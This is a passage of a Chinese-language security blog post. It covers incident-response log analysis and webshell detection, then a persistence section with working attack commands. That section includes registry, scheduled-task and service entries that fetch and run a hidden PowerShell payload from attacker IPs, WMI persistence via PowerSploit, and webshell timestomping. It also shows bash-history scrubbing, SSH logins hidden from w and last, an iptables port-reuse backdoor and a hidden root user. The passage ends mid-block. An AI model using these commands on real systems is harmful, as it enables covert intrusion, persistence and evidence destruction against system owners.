&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class=\"line\"></span><br><span class=\"line\">爆破用户名字典是什么？</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/secure| awk &#x27;&#123;print $9&#125;&#x27; | sort -nr | uniq -c</span><br><span class=\"line\"> </span><br><span class=\"line\">2、登录成功的IP有哪些： \t</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class=\"line\"></span><br><span class=\"line\">登录成功的日期、用户名、IP：</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class=\"line\"></span><br><span class=\"line\">3、增加一个用户kali日志：</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class=\"line\">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class=\"line\">, shell=/bin/bash</span><br><span class=\"line\">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class=\"line\">#grep &quot;useradd&quot; /var/log/secure </span><br><span class=\"line\"></span><br><span class=\"line\">4、删除用户kali日志：</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class=\"line\"># grep &quot;userdel&quot; /var/log/secure</span><br><span class=\"line\"></span><br><span class=\"line\">5、su切换用户：</span><br><span class=\"line\">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class=\"line\"></span><br><span class=\"line\">sudo授权执行:</span><br><span class=\"line\">sudo -l</span><br><span class=\"line\">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108174528702.png\" alt=\"image-20221108174528702\"></p>\n<p>账户 历史命令 端口 进程 开机启动 任务计划 日志</p>\n<h3 id=\"webshell-查杀\"><a class=\"markdownIt-Anchor\" href=\"#webshell-查杀\">#</a> webshell 查杀</h3>\n<h4 id=\"工具\"><a class=\"markdownIt-Anchor\" href=\"#工具\">#</a> 工具</h4>\n<p>1.D 盾</p>\n<p>2. 河马</p>\n<p>3. 百度 webdir</p>\n<p>4. 在线 webshell 查杀 bugscanner</p>\n<h4 id=\"发现webshell后门\"><a class=\"markdownIt-Anchor\" href=\"#发现webshell后门\">#</a> 发现 webshell 后门</h4>\n<p>1. 判断 hash</p>\n<p>2.diff</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff -c -a -r cms1 cms2</span><br><span class=\"line\">md5sum比较两个文件夹下面文件是否相同</span><br><span class=\"line\"></span><br><span class=\"line\">Copy文件夹之后，检测两个文件夹（dir1，dir2）下文件是否相同。logdir 是任何一个存放生成文件的目录</span><br><span class=\"line\">cd dir1</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\"></span><br><span class=\"line\">cd dir2</span><br><span class=\"line\">find ./ -type f -exec md5sum &#123;&#125; \\; | sort -k 2  &gt; result.txt</span><br><span class=\"line\">cd logdir</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">diff result.txt result.txt</span><br></pre></td></tr></table></figure>\n<p>3. 工具</p>\n<p>winMerge</p>\n<p>beyond compare</p>\n<h2 id=\"日志分析\"><a class=\"markdownIt-Anchor\" href=\"#日志分析\">#</a> 日志分析</h2>\n<h3 id=\"windows日志分析\"><a class=\"markdownIt-Anchor\" href=\"#windows日志分析\">#</a> Windows 日志分析</h3>\n<p>Windows 系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>\n<p>Windows 主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>\n<blockquote>\n<p>系统日志</p>\n<p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由 Windows NT/2000 操作系统预先定义。</p>\n<p>默认位置： % SystemRoot%\\System32\\Winevt\\Logs\\System.evtx</p>\n<p>应用程序日志</p>\n<p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx</p>\n<p>安全日志</p>\n<p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</p>\n<p>默认位置：% SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</p>\n</blockquote>\n<p><strong>开启审核策略</strong></p>\n<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109145256851.png\" alt=\"image-20221109145256851\"></p>\n<p><strong>设置日志属性</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192149696.png\" alt=\"image-20221109192149696\"></p>\n<h4 id=\"日志分析-2\"><a class=\"markdownIt-Anchor\" href=\"#日志分析-2\">#</a> 日志分析</h4>\n<p>对于 Windows 事件日志分析，不同的 EVENT ID 代表了不同的意义，摘录一些常见的安全事件的说明：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109144436445.png\" alt=\"image-20221109144436445\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109153134531.png\" alt=\"image-20221109153134531\"></p>\n<p>4634,4647 远程登录注销时触发</p>\n<h4 id=\"工具分析\"><a class=\"markdownIt-Anchor\" href=\"#工具分析\">#</a> 工具分析：</h4>\n<p><strong>Log Parser</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">登录成功的所有事件</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">指定登录时间范围的事件：</span><br><span class=\"line\">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">提取登录成功的用户名和IP：</span><br><span class=\"line\">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\\Security.evtx where EventID=4624&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>LogParser Lizard</strong></p>\n<p><strong>Event Log Explorer</strong></p>\n<h3 id=\"linux-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#linux-日志分析\">#</a> linux 日志分析</h3>\n<p>日志默认存放位置：/var/log/</p>\n<p>查看日志配置情况：more /etc/rsyslog.conf</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109192416867.png\" alt=\"image-20221109192416867\"></p>\n<p>比较重要的几个日志：<br>\n登录失败记录：/var/log/btmp     //lastb</p>\n<p>​\t最后一次登录：/var/log/lastlog  //lastlog</p>\n<p>​\t登录成功记录: /var/log/wtmp     //last</p>\n<p>​\t登录日志记录：/var/log/secure</p>\n<p>​\t目前登录用户信息：/var/run/utmp  //w、who、users</p>\n<p>​\t历史命令记录：history</p>\n<p>​\t仅清理当前用户： history -c</p>\n<p>日志分析 find grep egrep awk sed</p>\n<h3 id=\"web-日志分析\"><a class=\"markdownIt-Anchor\" href=\"#web-日志分析\">#</a> web 日志分析</h3>\n<p>Apache 日志分析技巧：</p>\n<p>Web 访问日志记录了 Web 服务器接收处理请求及运行时错误等各种原始信息。通过对 WEB 日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、列出当天访问次数最多的IP命令：</span><br><span class=\"line\">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class=\"line\"></span><br><span class=\"line\">2、查看当天有多少个IP访问：</span><br><span class=\"line\">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">3、查看某一个页面被访问的次数：</span><br><span class=\"line\">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">4、查看每一个IP访问了多少个页面：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class=\"line\"></span><br><span class=\"line\">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class=\"line\">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class=\"line\"></span><br><span class=\"line\">6、查看某一个IP访问了哪些页面：</span><br><span class=\"line\">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">7、去掉搜索引擎统计当天的页面：</span><br><span class=\"line\">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class=\"line\"></span><br><span class=\"line\">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class=\"line\">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l\t</span><br></pre></td></tr></table></figure>\n<p>日志分析过程</p>\n<p>1、定位攻击源</p>\n<p>2、搜索相关日志记录</p>\n<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>\n<p>4. 加固攻击者访问的网站</p>\n<h3 id=\"mysql日志分析\"><a class=\"markdownIt-Anchor\" href=\"#mysql日志分析\">#</a> mysql 日志分析</h3>\n<p>设置日志</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、查看log配置信息</span><br><span class=\"line\">show variables like &#x27;%general%&#x27;;</span><br><span class=\"line\">2、开启日志</span><br><span class=\"line\">SET GLOBAL general_log = &#x27;On&#x27;;</span><br><span class=\"line\">3、指定日志文件路径</span><br><span class=\"line\">#SET GLOBAL general_log_file = &#x27;/var/lib/mysql/mysql.log&#x27;;</span><br></pre></td></tr></table></figure>\n<p>主要需要注意爆破 root 密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#有哪些IP在爆破</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f4|uniq -c|sort -nr</span><br><span class=\"line\">     27 192.168.204.1</span><br><span class=\"line\"></span><br><span class=\"line\">#爆破用户名字典都有哪些</span><br><span class=\"line\">grep  &quot;Access denied&quot; mysql.log |cut -d &quot;&#x27;&quot; -f2|uniq -c|sort -nr</span><br><span class=\"line\">     13 mysql</span><br><span class=\"line\">     12 root</span><br><span class=\"line\">      1 root</span><br><span class=\"line\">      1 mysql</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>如果爆破密码，失败的时候会显示 &quot;Access denied&quot;，可靠此进行分析</p>\n<h2 id=\"权限维持\"><a class=\"markdownIt-Anchor\" href=\"#权限维持\">#</a> 权限维持</h2>\n<h3 id=\"windows-2\"><a class=\"markdownIt-Anchor\" href=\"#windows-2\">#</a> Windows</h3>\n<h4 id=\"0x01-注册表自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x01-注册表自启动\">#</a> 0x01 注册表自启动</h4>\n<p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Run键 </span><br><span class=\"line\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span><br><span class=\"line\"></span><br><span class=\"line\"># Winlogon\\Userinit键</span><br><span class=\"line\">HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon</span><br><span class=\"line\"></span><br><span class=\"line\">类似的还有很多,关键词：注册表启动键值。</span><br></pre></td></tr></table></figure>\n<p><strong>不落地的后门通过 cs 的 web 投递生成</strong></p>\n<p>使用以下命令可以一键实现无文件注册表后门：不落地</p>\n<p><code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring('http://192.168.174.131/a'))\\&quot;&quot; /f</code></p>\n<p><strong>Logon Scripts 后门</strong></p>\n<p>注册表路径：HKEY_CURRENT_USER\\Environment\\</p>\n<p>创建字符串键值：  UserInitMprLogonScript，键值设置为 bat 的绝对路径： <code>c:\\test.bat</code></p>\n<p><strong>userinit 后门</strong></p>\n<p>在用户进行登陆时，winlogon 运行指定的程序。根据官方文档，可以更改它的值来添加与删除程序。</p>\n<p>利用 USERINIT 注册表键实现无文件后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]</span><br><span class=\"line\"> </span><br><span class=\"line\">&quot;Userinit&quot;=&quot;C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.142:8888/logo.gif&#x27;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x02-组策略设置脚本启动\"><a class=\"markdownIt-Anchor\" href=\"#0x02-组策略设置脚本启动\">#</a> 0x02 组策略设置脚本启动</h4>\n<p>运行 gpedit.msc 进入本地组策略，通过 Windows 设置的 “脚本 (启动 / 关机)” 项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221109181141835.png\" alt=\"image-20221109181141835\"></p>\n<p>脚本名写 powershell 绝对路径，脚本参数写 web 投递后门</p>\n<h4 id=\"0x03-计划任务\"><a class=\"markdownIt-Anchor\" href=\"#0x03-计划任务\">#</a> 0x03 计划任务</h4>\n<p>通过 window 系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。</p>\n<p>使用以下命令可以一键实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">schtasks /create /sc minute /mo 1 /tn &quot;Security Script&quot; /tr &quot;powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(\\&quot;\\&quot;\\&quot;http://192.168.3.48:8080/T5uEhVubWqF\\&quot;\\&quot;\\&quot;))\\&quot;&quot;</span><br></pre></td></tr></table></figure>\n<p>容易遇到的问题：cmd 命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。</p>\n<p>合理的日期：某月某月凌晨三点</p>\n<h4 id=\"0x04-服务自启动\"><a class=\"markdownIt-Anchor\" href=\"#0x04-服务自启动\">#</a> 0x04 服务自启动</h4>\n<p>通过服务设置自启动，结合 powershell 实现无文件后门。</p>\n<p>使用以下命令可实现：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sc create &quot;KeyName&quot; binpath= &quot;cmd /c start powershell.exe -nop -w hidden -c \\&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.3.48:8080/T5uEhVubWqF&#x27;))\\&quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">sc description  KeyName &quot;Just For Test&quot;   //设置服务的描述字符串</span><br><span class=\"line\">sc config Name start= auto                //设置这个服务为自动启动</span><br><span class=\"line\">net start Name                            //启动服务</span><br></pre></td></tr></table></figure>\n<p>成功创建了一个自启动服务</p>\n<p><strong>通过服务自启动上线权限为 system</strong></p>\n<h4 id=\"0x05-wmi后门\"><a class=\"markdownIt-Anchor\" href=\"#0x05-wmi后门\">#</a> 0x05 WMI 后门</h4>\n<p>在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 WMI。这里可以利用一个工具 powersploit，下面用它的 Persistence 模块来示范一个简单的例子。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Persistence\\Persistence.psm1</span><br><span class=\"line\">$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At &#x27;3 PM&#x27;</span><br><span class=\"line\">$UserOptions = New-UserPersistenceOption -Registry -AtLogon</span><br><span class=\"line\">Add-Persistence -FilePath .\\web.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose</span><br></pre></td></tr></table></figure>\n<h3 id=\"linux-2\"><a class=\"markdownIt-Anchor\" href=\"#linux-2\">#</a> linux</h3>\n<h4 id=\"0x00隐藏文件\"><a class=\"markdownIt-Anchor\" href=\"#0x00隐藏文件\">#</a> 0x00 隐藏文件</h4>\n<p>Linux 下创建一个隐藏文件： <code>touch  .test.txt</code></p>\n<h4 id=\"0x01隐藏文件时间戳\"><a class=\"markdownIt-Anchor\" href=\"#0x01隐藏文件时间戳\">#</a> 0x01 隐藏文件时间戳</h4>\n<p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>\n<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>\n<p>touch -r index.php webshell.php</p>\n<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>\n<p>touch -t 1401021042.30 webshell.php</p>\n<h4 id=\"0x03-隐藏权限\"><a class=\"markdownIt-Anchor\" href=\"#0x03-隐藏权限\">#</a> 0x03 隐藏权限</h4>\n<p>在 Linux 中，使用 chattr 命令来防止 root 和其他管理用户误删除和修改重要文件及目录，此权限用 ls -l 是查看不出来的，从而达到隐藏权限的目的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chattr +i evil.php 锁定文件</span><br><span class=\"line\">lsattr  evil.php   属性查看</span><br><span class=\"line\">chattr -i evil.php 解除锁定</span><br><span class=\"line\">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04隐藏历史命令\"><a class=\"markdownIt-Anchor\" href=\"#0x04隐藏历史命令\">#</a> 0x04 隐藏历史命令</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[space]set +o history</span><br><span class=\"line\">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>\n<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history -d [num]</span><br></pre></td></tr></table></figure>\n<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前 150 行是用户的正常操作记录，150 以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前 150 行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05隐藏ssh\"><a class=\"markdownIt-Anchor\" href=\"#0x05隐藏ssh\">#</a> 0x05 隐藏 ssh</h4>\n<p>#隐身登录系统，不会被 w、who、last 等指令检测到。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure>\n<p>这是因为 w 命令显示信息来源于 utmp，last 来源于 wtmp，并不是所有程序登录的时候都会调用 utmp 和 wtmp 日志记录接口，只有交互式会话，才会调用 utmp 和 wtmp 的日志记录接口，比如通过 tty 或者 pts 或者图形界面登录的都会调用 utmp 和 wtmp 日志记录接口，然后我们在使用 w 和 last 命令的时候就会发现登录信息</p>\n<p>不记录 ssh 公钥在本地.ssh 目录中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class=\"line\">-T 表示不分配伪终端 （正常的会话，在分配伪终端之后才会调用utmp和wtmp的日志接口）</span><br><span class=\"line\">/usr/bin/bash -i  表示在登录之后 调用bash命令</span><br><span class=\"line\">-i 表示是交互式shell</span><br></pre></td></tr></table></figure>\n<p>ssh -lroot 192.168.12.51/usr/bin/bash 其实就相当于登录之后直接调用 bash 这个名，此时系统没有为其分配 tty，不算一个完整交互式会话，只不过 bash 接受输入，然后有输出，让我们误以为是交互式会话，其实不然，你可以将 /usr/bin/bash 替换成 /usr/bin/ls 试一下，就是简单执行以下就退出了</p>\n<p>通过 ps -ef  和 lsof -i:22  仍然可以看到</p>\n<p>如果已经退出，那么可以到 secure 日志中找</p>\n<h4 id=\"0x06端口复用\"><a class=\"markdownIt-Anchor\" href=\"#0x06端口复用\">#</a> 0x06 端口复用</h4>\n<p>第二种方式：利用 IPTables 进行端口复用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 端口复用链</span><br><span class=\"line\">iptables -t nat -N LETMEIN</span><br><span class=\"line\"># 端口复用规则</span><br><span class=\"line\">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class=\"line\"># 开启开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class=\"line\"># 关闭开关</span><br><span class=\"line\">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class=\"line\"># let&#x27;s do it</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#开启复用</span><br><span class=\"line\">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class=\"line\">#ssh使用80端口进行登录</span><br><span class=\"line\">ssh -p 80 root@192.168.28.128</span><br><span class=\"line\">#关闭复用</span><br><span class=\"line\">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x00添加用户\"><a class=\"markdownIt-Anchor\" href=\"#0x00添加用户\">#</a> 0x00 添加用户</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 创建一个用户名guest，密码123456的root用户</span><br><span class=\"line\">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>\n<p>排查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询特权用户特权用户(uid 为0)</span><br><span class=\"line\">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class=\"line\"># 查询可以远程登录的帐号信息</span><br><span class=\"line\">[root@localhost ~]# awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class=\"line\"># 